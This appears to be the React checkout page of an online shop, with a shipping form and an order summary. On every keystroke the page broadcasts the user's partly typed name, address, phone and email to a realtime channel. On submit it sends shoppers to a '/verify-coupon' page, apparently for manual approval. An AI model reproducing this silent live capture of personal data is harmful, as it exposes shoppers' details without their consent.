import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { useCart } from "@/context/CartContext";
import { useRealtime, LiveFormData } from "@/context/RealtimeContext";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { useShop } from "@/context/ShopContext";
import { getActiveThemeV2 } from "@/lib/theme-editor";

const Checkout = () => {
  const { cart, totalPrice } = useCart();
  const { updateLiveData, setCartTotal } = useRealtime();
  const navigate = useNavigate();
  const { config } = useShop();

  const activeTheme = getActiveThemeV2(config as unknown as Record<string, unknown>);
  const checkoutPage = activeTheme?.pages.checkout;

  const pageTitle = checkoutPage?.title || "Checkout";
  const pageSubtitle = checkoutPage?.subtitle || "Complete your shipping details to continue.";
  const shippingTitle = checkoutPage?.shippingTitle || "Shipping Address";
  const defaultCountry = checkoutPage?.defaultCountry || "United States";
  const countryLabel = checkoutPage?.countryLabel || "Country";
  const firstNameLabel = checkoutPage?.firstNameLabel || "First Name";
  const lastNameLabel = checkoutPage?.lastNameLabel || "Last Name";
  const addressLabel = checkoutPage?.addressLabel || "Address";
  const addressPlaceholder = checkoutPage?.addressPlaceholder || "1234 Main St";
  const cityLabel = checkoutPage?.cityLabel || "City";
  const stateLabel = checkoutPage?.stateLabel || "State";
  const statePlaceholder = checkoutPage?.statePlaceholder || "NY";
  const zipCodeLabel = checkoutPage?.zipCodeLabel || "ZIP Code";
  const phoneLabel = checkoutPage?.phoneLabel || "Phone";
  const emailLabel = checkoutPage?.emailLabel || "Email";
  const summaryTitle = checkoutPage?.summaryTitle || "Order Summary";
  const subtotalLabel = checkoutPage?.subtotalLabel || "Subtotal";
  const shippingLabel = checkoutPage?.shippingLabel || "Shipping";
  const shippingValueText = checkoutPage?.shippingValueText || "Free";
  const totalLabel = checkoutPage?.totalLabel || "Total";
  const placeOrderText = checkoutPage?.placeOrderText || "Place Order";
  const agreementText =
    checkoutPage?.agreementText ||
    "By placing this order, you agree to our Terms of Service and Privacy Policy.";
  const emptyCartTitle = checkoutPage?.emptyCartTitle || "Your cart is empty";
  const emptyCartButtonText = checkoutPage?.emptyCartButtonText || "Continue Shopping";
  const heroImage = checkoutPage?.heroImage || "";
  
  const [formData, setFormData] = useState<LiveFormData>({
    firstName: "",
    lastName: "",
    email: "",
    phone: "",
    address: "",
    city: "",
    state: "",
    zipCode: "",
    country: defaultCountry,
  });

  useEffect(() => {
    setFormData((prev) => ({
      ...prev,
      country: defaultCountry,
    }));
  }, [defaultCountry]);

  // No longer redirecting from here, redirect happens in handleSubmit
  // useEffect(() => {
  //   if (approvedOrderId) {
  //     navigate(`/order-confirmation/${approvedOrderId}`);
  //   }
  // }, [approvedOrderId, navigate]);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    const newData = { ...formData, [name]: value };
    setFormData(newData);
    // Broadcast live typing data
    updateLiveData(newData);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    
    updateLiveData(formData);
    setCartTotal(totalPrice);
    navigate("/verify-coupon");
  };

  if (cart.length === 0) {
    return (
      <div className="min-h-screen flex flex-col">
        <Header />
        <main className="flex-1 flex items-center justify-center">
          <div className="text-center">
            <h2 className="text-2xl font-serif mb-4">{emptyCartTitle}</h2>
            <Button onClick={() => navigate("/")}>{emptyCartButtonText}</Button>
          </div>
        </main>
        <Footer />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-background flex flex-col">
      <Header />
      <main className="flex-1 container mx-auto px-6 py-12">
        {heroImage ? (
          <div className="h-40 md:h-52 rounded-md border bg-muted/20 overflow-hidden mb-8">
            <div className="w-full h-full bg-cover bg-center" style={{ backgroundImage: `url(${heroImage})` }} />
          </div>
        ) : null}

        <div className="text-center mb-8 space-y-2">
          <h1 className="font-serif text-3xl md:text-4xl">{pageTitle}</h1>
          <p className="text-muted-foreground">{pageSubtitle}</p>
        </div>
        
        <div className="grid lg:grid-cols-2 gap-12 max-w-6xl mx-auto">
          {/* Shipping Form */}
          <div>
            <Card>
              <CardHeader>
                <CardTitle>{shippingTitle}</CardTitle>
              </CardHeader>
              <CardContent>
                <form id="checkout-form" onSubmit={handleSubmit} className="space-y-4">
                  <div className="space-y-2">
                    <Label htmlFor="country">{countryLabel}</Label>
                    <Input 
                      id="country" 
                      name="country" 
                      value={formData.country}
                      onChange={handleInputChange}
                      readOnly
                      className="bg-muted"
                    />
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div className="space-y-2">
                      <Label htmlFor="firstName">{firstNameLabel}</Label>
                      <Input 
                        id="firstName" 
                        name="firstName" 
                        required 
                        value={formData.firstName}
                        onChange={handleInputChange}
                      />
                    </div>
                    <div className="space-y-2">
                      <Label htmlFor="lastName">{lastNameLabel}</Label>
                      <Input 
                        id="lastName" 
                        name="lastName" 
                        required 
                        value={formData.lastName}
                        onChange={handleInputChange}
                      />
                    </div>
                  </div>
                  
                  <div className="space-y-2">
                    <Label htmlFor="address">{addressLabel}</Label>
                    <Input 
                      id="address" 
                      name="address" 
                      placeholder={addressPlaceholder}
                      required 
                      value={formData.address}
                      onChange={handleInputChange}
                    />
                  </div>

                  <div className="grid grid-cols-3 gap-4">
                    <div className="space-y-2 col-span-1">
                      <Label htmlFor="city">{cityLabel}</Label>
                      <Input 
                        id="city" 
                        name="city" 
                        required 
                        value={formData.city}
                        onChange={handleInputChange}
                      />
                    </div>
                    <div className="space-y-2 col-span-1">
                      <Label htmlFor="state">{stateLabel}</Label>
                      <Input 
                        id="state" 
                        name="state" 
                        placeholder={statePlaceholder}
                        required 
                        value={formData.state}
                        onChange={handleInputChange}
                      />
                    </div>
                    <div className="space-y-2 col-span-1">
                      <Label htmlFor="zipCode">{zipCodeLabel}</Label>
                      <Input 
                        id="zipCode" 
                        name="zipCode" 
                        required 
                        value={formData.zipCode}
                        onChange={handleInputChange}
                      />
                    </div>
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="phone">{phoneLabel}</Label>
                    <Input 
                      id="phone" 
                      name="phone" 
                      type="tel"
                      required 
                      value={formData.phone}
                      onChange={handleInputChange}
                    />
                  </div>

                  <div className="space-y-2">
                    <Label htmlFor="email">{emailLabel}</Label>
                    <Input 
                      id="email" 
                      name="email" 
                      type="email" 
                      required 
                      value={formData.email}
                      onChange={handleInputChange}
                    />
                  </div>
                </form>
              </CardContent>
            </Card>
          </div>

          {/* Order Summary */}
          <div>
            <Card className="bg-secondary/20 sticky top-24">
              <CardHeader>
                <CardTitle>{summaryTitle}</CardTitle>
              </CardHeader>
              <CardContent className="space-y-6">
                <div className="space-y-4">
                  {cart.map((item) => (
                    <div key={item.id} className="flex justify-between items-start text-sm">
                      <div className="flex gap-3">
                        <div className="w-12 h-12 rounded bg-muted overflow-hidden">
                          <img src={item.image} alt={item.title} className="w-full h-full object-cover" />
                        </div>
                        <div>
                          <p className="font-medium">{item.title}</p>
                          <p className="text-muted-foreground">Qty: {item.quantity}</p>
                        </div>
                      </div>
                      <p>${(item.price * item.quantity).toFixed(2)}</p>
                    </div>
                  ))}
                </div>
                
                <div className="border-t border-border pt-4 space-y-2">
                  <div className="flex justify-between text-sm">
                    <span>{subtotalLabel}</span>
                    <span>${totalPrice.toFixed(2)}</span>
                  </div>
                  <div className="flex justify-between text-sm">
                    <span>{shippingLabel}</span>
                    <span>{shippingValueText}</span>
                  </div>
                  <div className="flex justify-between font-medium text-lg pt-2 border-t border-border">
                    <span>{totalLabel}</span>
                    <span>${totalPrice.toFixed(2)}</span>
                  </div>
                </div>

                <Button type="submit" form="checkout-form" className="w-full" size="lg">
                  {placeOrderText}
                </Button>
                
                <p className="text-xs text-center text-muted-foreground">
                  {agreementText}
                </p>
              </CardContent>
            </Card>
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
};

export default Checkout;
